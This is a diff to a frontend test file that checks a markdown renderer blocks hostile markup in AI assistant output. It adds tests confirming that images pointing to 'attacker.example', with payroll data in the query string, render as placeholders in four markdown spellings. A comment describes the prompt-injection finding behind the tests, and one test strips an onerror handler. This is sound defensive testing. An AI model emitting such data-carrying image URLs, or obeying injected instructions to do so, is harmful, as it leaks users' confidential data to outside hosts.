@@ -52,14 +52,18 @@ describe('renderAssistantMarkdown — markup carried in model output', () => {
   })
 
   it('strips onerror handlers from images but keeps the image', () => {
+    // A source the sanitizer allows (the Data Stash download route), so the
+    // image survives and this stays a test of the handler strip. It was
+    // `x.png` until #415 D13 refused every other source.
+    const src = '/api/stash/document/doc-1?sessionId=s1&download'
     const out = renderAssistantMarkdown(
-      '<img src="x.png" onerror="window.stolen = 1">',
+      `<img src="${src}" onerror="window.stolen = 1">`,
       noEntities,
       [],
     )
     const img = mount(out).querySelector('img')
     expect(img).not.toBeNull()
-    expect(img!.getAttribute('src')).toBe('x.png')
+    expect(img!.getAttribute('src')).toBe(src)
     expect(img!.hasAttribute('onerror')).toBe(false)
   })
 
@@ -104,6 +108,43 @@ describe('renderAssistantMarkdown — markup carried in model output', () => {
     expect(out).toContain('<li>item one</li>')
     expect(out).toContain('<blockquote>')
     expect(out).toContain('href="https://example.test/docs"')
+  })
+})
+
+describe('renderAssistantMarkdown — a remote image in the answer does not load (#415 D13)', () => {
+  // The finding, end to end: an injected instruction makes the model print a
+  // markdown image whose URL carries data, and rendering the answer used to
+  // fetch it. Every markdown spelling of an image goes through marked's `<img>`,
+  // so each is asserted through the whole pipeline rather than at the sanitizer.
+  const exfil = 'https://attacker.example/p.png?d=Q3-payroll-total'
+  const spellings: Array<[string, string]> = [
+    ['an inline image', `Summary done. ![chart](${exfil})`],
+    ['a reference-style image', `Summary done. ![chart][r]\n\n[r]: ${exfil}`],
+    ['an image inside a link', `[![badge](${exfil})](https://example.test/)`],
+    ['a raw <img> in the answer', `Summary done. <img src="${exfil}">`],
+  ]
+
+  it.each(spellings)('%s renders as a placeholder, never an <img>', (_label, md) => {
+    const host = mount(renderAssistantMarkdown(md, noEntities, []))
+
+    expect(host.querySelector('img')).toBeNull()
+    const placeholder = host.querySelector('span.blocked-image')
+    expect(placeholder?.textContent).toBe(`Image blocked: ${exfil}`)
+    // No attribute anywhere still carries the URL — the anchor's href in the
+    // link case is a different URL, and loads only on a click.
+    expect(attributeNames(host)).not.toContain('src')
+    expect(host.innerHTML).not.toMatch(/(src|srcset|style)="[^"]*attacker/)
+  })
+
+  it('survives entity annotation, which runs after the sanitizer', () => {
+    // The annotators rewrite text segments; the placeholder's text is one.
+    const host = mount(
+      renderAssistantMarkdown(`Acme results ![x](${exfil})`, new Map([['Acme', ['n1']]]), []),
+    )
+
+    expect(host.querySelector('img')).toBeNull()
+    expect(host.querySelector('span.blocked-image')).not.toBeNull()
+    expect(host.querySelector('.graph-entity')?.textContent).toBe('Acme')
   })
 })
 
